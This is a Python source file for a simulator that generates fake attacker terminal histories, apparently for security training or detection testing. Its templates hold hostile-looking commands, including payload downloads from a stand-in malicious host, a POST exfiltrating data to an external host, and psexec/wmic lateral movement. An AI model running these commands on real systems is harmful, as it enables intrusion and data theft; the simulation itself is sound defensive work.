from typing import Dict, List


class TerminalGenerator:
    """
    Generates attacker command history
    from simulation events.
    """

    COMMAND_TEMPLATES = {
        "phishing": [
            "powershell Invoke-WebRequest http://malicious-site.com",
            "curl http://malicious-site.com/payload.exe"
        ],

        "credential_access": [
            "whoami",
            "net user",
            "runas /user:administrator cmd"
        ],

        "lateral_movement": [
            "net use \\\\FILE-SRV01\\share",
            "wmic process call create cmd.exe",
            "psexec \\\\FILE-SRV01 cmd"
        ],

        "privilege_escalation": [
            "whoami /priv",
            "net localgroup administrators"
        ],

        "reconnaissance": [
            "ipconfig",
            "netstat -ano",
            "arp -a"
        ],

        "data_exfiltration": [
            "tar -czf data.tar.gz sensitive/",
            "curl -X POST https://external-host/upload"
        ]
    }

    @classmethod
    def generate_history(
        cls,
        timeline: List[Dict],
        state
    ) -> List[Dict]:

        history = []

        for event in timeline:

            commands = cls.COMMAND_TEMPLATES.get(
                event["event_type"],
                []
            )

            for command in commands:

                history.append(
                    {
                        "timestamp": event["timestamp"],
                        "event_type": event["event_type"],
                        "attacker_ip": state.attacker_ip,
                        "attacker_hostname": state.attacker_hostname,
                        "target_ip": state.target_ip,
                        "target_hostname": state.target_hostname,
                        "command": command
                    }
                )

        return history